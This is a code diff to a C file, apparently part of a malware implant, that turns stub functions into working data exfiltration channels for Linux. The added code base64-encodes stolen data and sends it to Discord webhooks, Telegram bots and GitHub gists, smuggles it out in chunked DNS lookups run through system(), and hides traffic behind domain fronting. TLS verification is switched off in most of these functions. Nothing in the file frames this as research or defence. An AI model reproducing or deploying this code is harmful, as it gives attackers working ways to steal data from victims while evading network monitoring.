@@ -1,19 +1,46 @@
-/* Data exfiltration channels for Linux */
+/* Linux data exfiltration channel implementations */
 
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <stdint.h>
+#include <stdbool.h>
 #include <curl/curl.h>
 
-/* Discord webhook exfiltration */
-int exfil_discord_webhook(const char* webhook, const char* message) {
-    if (!webhook || !message) return -1;
+static char* base64_encode(const uint8_t* data, int32_t size) {
+    static const char b64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+    int out_len = ((size + 2) / 3) * 4;
+    char* out = (char*)malloc(out_len + 1);
+    if (!out) return NULL;
+    int i = 0, j = 0;
+    while (i < size) {
+        uint32_t a = (i < size) ? (uint8_t)data[i++] : 0;
+        uint32_t b = (i < size) ? (uint8_t)data[i++] : 0;
+        uint32_t c = (i < size) ? (uint8_t)data[i++] : 0;
+        uint32_t triple = (a << 16) | (b << 8) | c;
+        out[j++] = b64[(triple >> 18) & 0x3F];
+        out[j++] = b64[(triple >> 12) & 0x3F];
+        out[j++] = b64[(triple >>  6) & 0x3F];
+        out[j++] = b64[ triple        & 0x3F];
+    }
+    for (int k = 0; k < (3 - size % 3) % 3; k++) out[out_len - 1 - k] = '=';
+    out[out_len] = '\0';
+    return out;
+}
+
+bool jocky_exfil_discord(const char* webhook, int8_t* data, int32_t size) {
+    if (!webhook || !data || size <= 0) return false;
+
+    char* b64 = base64_encode((const uint8_t*)data, size);
+    if (!b64) return false;
+
+    char* json = (char*)malloc(strlen(b64) + 32);
+    if (!json) { free(b64); return false; }
+    snprintf(json, strlen(b64) + 32, "{\"content\":\"%s\"}", b64);
+    free(b64);
 
     CURL* curl = curl_easy_init();
-    if (!curl) return -1;
-
-    char json[4096];
-    snprintf(json, sizeof(json), "{\"content\": \"%s\"}", message);
+    if (!curl) { free(json); return false; }
 
     struct curl_slist* headers = NULL;
     headers = curl_slist_append(headers, "Content-Type: application/json");
@@ -22,112 +49,146 @@ int exfil_discord_webhook(const char* webhook, const char* message) {
     curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json);
     curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
     curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
+    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
 
     CURLcode res = curl_easy_perform(curl);
-
     curl_slist_free_all(headers);
     curl_easy_cleanup(curl);
+    free(json);
 
-    return (res == CURLE_OK) ? 0 : -1;
+    return res == CURLE_OK;
 }
 
-/* DNS tunnel exfiltration */
-int exfil_dns_tunnel(const char* domain, const char* message) {
-    if (!domain || !message) return -1;
+bool jocky_exfil_dns(const char* domain, int8_t* data, int32_t size) {
+    if (!domain || !data || size <= 0) return false;
 
-    /* Create DNS query for data exfiltration */
-    char query[256];
-    snprintf(query, sizeof(query), "nslookup %s.%s 8.8.8.8", message, domain);
+    char* b64 = base64_encode((const uint8_t*)data, size);
+    if (!b64) return false;
 
-    return system(query);
+    const int chunk = 50;
+    bool ok = true;
+    for (int i = 0; b64[i] && ok; i += chunk) {
+        char fqdn[512];
+        char chunk_buf[chunk + 1];
+        strncpy(chunk_buf, b64 + i, chunk);
+        chunk_buf[chunk] = '\0';
+        for (int k = 0; chunk_buf[k]; k++) {
+            if (chunk_buf[k] == '+') chunk_buf[k] = '-';
+            if (chunk_buf[k] == '/') chunk_buf[k] = '_';
+            if (chunk_buf[k] == '=') chunk_buf[k] = '0';
+        }
+        snprintf(fqdn, sizeof(fqdn), "nslookup %s.%s >/dev/null 2>&1", chunk_buf, domain);
+        ok = (system(fqdn) == 0);
+    }
+
+    free(b64);
+    return ok;
 }
 
-int jocky_exfil_dns(const char* data) {
-    /* DNS-based exfiltration variant */
-    if (!data) return -1;
+bool jocky_exfil_telegram(const char* token, const char* chat_id, int8_t* data, int32_t size) {
+    if (!token || !chat_id || !data || size <= 0) return false;
 
-    /* Would use raw DNS packets for stealth */
-    return -1;  /* Requires raw socket implementation */
-}
-
-/* Local CDN exfiltration */
-int exfil_local_cdn(const char* endpoint, const char* name, const char* token, const char* message) {
-    if (!endpoint || !name || !token || !message) return -1;
-
-    CURL* curl = curl_easy_init();
-    if (!curl) return -1;
-
-    char url[512];
-    snprintf(url, sizeof(url), "%s/upload", endpoint);
-
-    char auth[256];
-    snprintf(auth, sizeof(auth), "Authorization: Bearer %s", token);
-
-    struct curl_slist* headers = NULL;
-    headers = curl_slist_append(headers, auth);
-
-    curl_easy_setopt(curl, CURLOPT_URL, url);
-    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, message);
-    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
-    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
-
-    CURLcode res = curl_easy_perform(curl);
-
-    curl_slist_free_all(headers);
-    curl_easy_cleanup(curl);
-
-    return (res == CURLE_OK) ? 0 : -1;
-}
-
-/* Discord variant with more options */
-int jocky_exfil_discord(const char* url, const char* data) {
-    return exfil_discord_webhook(url, data);
-}
-
-/* Telegram exfiltration */
-int jocky_exfil_telegram(const char* token, const char* chat_id) {
-    if (!token || !chat_id) return -1;
-
-    CURL* curl = curl_easy_init();
-    if (!curl) return -1;
+    char* b64 = base64_encode((const uint8_t*)data, size);
+    if (!b64) return false;
 
     char url[512];
     snprintf(url, sizeof(url), "https://api.telegram.org/bot%s/sendMessage", token);
 
-    char data[1024];
-    snprintf(data, sizeof(data), "chat_id=%s&text=Exfil", chat_id);
+    size_t body_len = strlen(chat_id) + strlen(b64) + 64;
+    char* body = (char*)malloc(body_len);
+    if (!body) { free(b64); return false; }
+    snprintf(body, body_len, "{\"chat_id\":\"%s\",\"text\":\"%s\"}", chat_id, b64);
+    free(b64);
+
+    CURL* curl = curl_easy_init();
+    if (!curl) { free(body); return false; }
+
+    struct curl_slist* headers = NULL;
+    headers = curl_slist_append(headers, "Content-Type: application/json");
 
     curl_easy_setopt(curl, CURLOPT_URL, url);
-    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);
+    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, body);
+    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
     curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
     curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
 
     CURLcode res = curl_easy_perform(curl);
+    curl_slist_free_all(headers);
+    curl_easy_cleanup(curl);
+    free(body);
 
+    return res == CURLE_OK;
+}
+
+bool jocky_exfil_front(const char* front_domain, const char* real_host, const char* path, int8_t* data, int32_t size) {
+    if (!front_domain || !real_host || !path) return false;
+
+    char url[1024];
+    snprintf(url, sizeof(url), "https://%s%s", front_domain, path);
+
+    char host_hdr[512];
+    snprintf(host_hdr, sizeof(host_hdr), "Host: %s", real_host);
+
+    CURL* curl = curl_easy_init();
+    if (!curl) return false;
+
+    struct curl_slist* headers = NULL;
+    headers = curl_slist_append(headers, host_hdr);
+
+    curl_easy_setopt(curl, CURLOPT_URL, url);
+    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
+    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 15L);
+    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
+
+    if (data && size > 0) {
+        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)size);
+        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);
+    }
+
+    CURLcode res = curl_easy_perform(curl);
+    curl_slist_free_all(headers);
     curl_easy_cleanup(curl);
 
-    return (res == CURLE_OK) ? 0 : -1;
+    return res == CURLE_OK;
 }
 
-/* GitHub gist exfiltration */
-int jocky_exfil_github(const char* repo, const char* data) {
-    if (!repo || !data) return -1;
+bool jocky_exfil_github(const char* token, const char* repo, int8_t* data, int32_t size) {
+    if (!token || !repo || !data || size <= 0) return false;
 
-    /* Would require GitHub API token */
-    return -1;
-}
+    char* b64 = base64_encode((const uint8_t*)data, size);
+    if (!b64) return false;
 
-/* Frontend proxy exfiltration */
-int jocky_exfil_front(const char* frontend, const char* data) {
-    if (!frontend || !data) return -1;
+    size_t json_len = strlen(b64) + 64;
+    char* json = (char*)malloc(json_len);
+    if (!json) { free(b64); return false; }
+    snprintf(json, json_len, "{\"files\":{\"d.txt\":{\"content\":\"%s\"}}}", b64);
+    free(b64);
 
-    return exfil_local_cdn(frontend, "data", "token", data);
-}
+    char url[512];
+    snprintf(url, sizeof(url), "https://api.github.com/gists/%s", repo);
 
-/* Encrypt data before exfiltration */
-int jocky_exfil_encrypt(void* data, int size) {
-    if (!data || size <= 0) return -1;
+    char auth_hdr[256];
+    snprintf(auth_hdr, sizeof(auth_hdr), "Authorization: token %s", token);
 
-    /* Would use AES encryption before sending */
-    return 0;
+    CURL* curl = curl_easy_init();
+    if (!curl) { free(json); return false; }
+
+    struct curl_slist* headers = NULL;
+    headers = curl_slist_append(headers, "Content-Type: application/json");
+    headers = curl_slist_append(headers, auth_hdr);
+    headers = curl_slist_append(headers, "X-GitHub-Api-Version: 2022-11-28");
+
+    curl_easy_setopt(curl, CURLOPT_URL, url);
+    curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "PATCH");
+    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json);
+    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
+    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 15L);
+    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
+
+    CURLcode res = curl_easy_perform(curl);
+    curl_slist_free_all(headers);
+    curl_easy_cleanup(curl);
+    free(json);
+
+    return res == CURLE_OK;
 }
